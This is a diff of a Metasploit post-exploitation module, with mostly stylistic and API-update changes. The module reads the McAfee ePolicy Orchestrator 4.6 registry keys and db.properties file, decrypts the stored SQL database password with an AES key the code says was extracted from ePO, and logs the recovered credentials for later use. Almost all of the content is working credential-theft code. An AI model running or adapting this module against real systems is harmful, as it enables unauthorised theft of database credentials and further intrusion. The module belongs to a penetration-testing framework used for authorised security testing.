@@ -1,15 +1,12 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-require "net/dns/resolver"
+require 'net/dns/resolver'
 require 'msf/core/auxiliary/report'
 
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
 
@@ -30,20 +27,20 @@ class Metasploit3 < Msf::Post
 
   def run
     # Find out where things are installed
-    print_status("Finding Tomcat install path...")
-    subkeys = registry_enumkeys("HKLM\\Software\\Network Associates\\ePolicy Orchestrator")
+    print_status('Finding Tomcat install path...')
+    subkeys = registry_enumkeys('HKLM\Software\Network Associates\ePolicy Orchestrator',REGISTRY_VIEW_32_BIT)
     if subkeys.nil? or subkeys.empty?
-      print_error ("ePO 4.6 Not Installed or No Permissions to RegKey")
+      print_error ('ePO 4.6 Not Installed or No Permissions to RegKey')
       return
     end
     # Get the db.properties file location
-    epol_reg_key = "HKLM\\Software\\Network Associates\\ePolicy Orchestrator"
-    dbprops_file = registry_getvaldata(epol_reg_key, "TomcatFolder")
-    if dbprops_file == nil or dbprops_file == ""
-      print_error("Could not find db.properties file location")
+    epol_reg_key = 'HKLM\Software\Network Associates\ePolicy Orchestrator'
+    dbprops_file = registry_getvaldata(epol_reg_key, 'TomcatFolder',REGISTRY_VIEW_32_BIT)
+    if dbprops_file == nil or dbprops_file == ''
+      print_error('Could not find db.properties file location')
     else
-      dbprops_file << "/conf/orion/db.properties";
-      print_good("Found db.properties location");
+      dbprops_file << '/conf/orion/db.properties';
+      print_good('Found db.properties location');
       process_config(dbprops_file);
     end
   end
@@ -57,39 +54,39 @@ class Metasploit3 < Msf::Post
       line.chomp
       line_array = line.split('=')
       case line_array[0]
-      when "db.database.name"
-        database_name = ""
+      when 'db.database.name'
+        database_name = ''
         line_array[1].each_byte { |x|  database_name << x unless x > 126 || x < 32 }
-      when "db.instance.name"
-        database_instance = ""
+      when 'db.instance.name'
+        database_instance = ''
         line_array[1].each_byte { |x|  database_instance << x unless x > 126 || x < 32 }
-      when "db.user.domain"
-        user_domain = ""
+      when 'db.user.domain'
+        user_domain = ''
         line_array[1].each_byte { |x|  user_domain << x unless x > 126 || x < 32 }
-      when "db.user.name"
-        user_name = ""
+      when 'db.user.name'
+        user_name = ''
         line_array[1].each_byte { |x|  user_name << x unless x > 126 || x < 32 }
-      when "db.port"
-        port = ""
+      when 'db.port'
+        port = ''
         line_array[1].each_byte { |x|  port << x unless x > 126 || x < 32 }
-      when "db.user.passwd.encrypted.ex"
+      when 'db.user.passwd.encrypted.ex'
         # ePO 4.6 encrypted password
-        passwd = ""
+        passwd = ''
         line_array[1].each_byte { |x|  passwd << x unless x > 126 || x < 32 }
-        passwd.gsub("\\","")
+        passwd.gsub('\\','')
         # Add any Base64 padding that may have been stripped out
-        passwd << "=" until ( passwd.length % 4 == 0 )
+        passwd << '=' until ( passwd.length % 4 == 0 )
         plaintext_passwd = decrypt46(passwd)
-      when "db.user.passwd.encrypted"
+      when 'db.user.passwd.encrypted'
         # ePO 4.5 encrypted password - not currently supported, see notes below
-        passwd = ""
+        passwd = ''
         line_array[1].each_byte { |x|  passwd << x unless x > 126 || x < 32 }
-        passwd.gsub("\\","")
+        passwd.gsub('\\','')
         # Add any Base64 padding that may have been stripped out
-        passwd << "=" until ( passwd.length % 4 == 0 )
-        plaintext_passwd = "PASSWORD NOT RECOVERED - ePO 4.5 DECRYPT SUPPORT IS WIP"
-      when "db.server.name"
-        database_server_name = ""
+        passwd << '=' until ( passwd.length % 4 == 0 )
+        plaintext_passwd = 'PASSWORD NOT RECOVERED - ePO 4.5 DECRYPT SUPPORT IS WIP'
+      when 'db.server.name'
+        database_server_name = ''
         line_array[1].each_byte { |x|  database_server_name << x unless x > 126 || x < 32 }
       end
     end
@@ -98,7 +95,7 @@ class Metasploit3 < Msf::Post
 
     result = client.net.resolve.resolve_host(database_server_name)
     if result[:ip].nil? or  result[:ip].empty?
-      print_error("Could not determine IP of DB - credentials not added to report database")
+      print_error('Could not determine IP of DB - credentials not added to report database')
       return
     end
 
@@ -111,11 +108,11 @@ class Metasploit3 < Msf::Post
       print_good("Database IP: #{db_ip}")
     end
     print_good("Port: #{port}")
-    if user_domain == nil or user_domain == ""
-      print_good("Authentication Type: SQL");
+    if user_domain == nil or user_domain == ''
+      print_good('Authentication Type: SQL');
       full_user = user_name
     else
-      print_good("Authentication Type: Domain");
+      print_good('Authentication Type: Domain');
       print_good("Domain: #{user_domain}");
       full_user = "#{user_domain}\\#{user_name}"
     end
@@ -127,8 +124,8 @@ class Metasploit3 < Msf::Post
       service_data = {
         address: Rex::Socket.getaddress(db_ip),
         port: port,
-        protocol: "tcp",
-        service_name: "mssql",
+        protocol: 'tcp',
+        service_name: 'mssql',
         workspace_id: myworkspace_id
       }
 
@@ -145,21 +142,21 @@ class Metasploit3 < Msf::Post
 
       login_data = {
         core: credential_core,
-        access_level: "User",
+        access_level: 'User',
         status: Metasploit::Model::Login::Status::UNTRIED
       }
 
       create_credential_login(login_data.merge(service_data))
-      print_good("Added credentials to report database")
+      print_good('Added credentials to report database')
     else
-      print_error("Could not determine IP of DB - credentials not added to report database")
+      print_error('Could not determine IP of DB - credentials not added to report database')
     end
   end
 
 
   def decrypt46(encoded)
     encrypted_data = Rex::Text.decode_base64(encoded)
-    aes = OpenSSL::Cipher::Cipher.new("AES-128-ECB")
+    aes = OpenSSL::Cipher.new('AES-128-ECB')
     aes.padding = 0
     aes.decrypt
     # Private key extracted from ePO 4.6.0 Build 1029
@@ -172,6 +169,5 @@ class Metasploit3 < Msf::Post
     password.gsub!(/[^[:print:]]/,'')
     return password
   end
-
-
 end
+
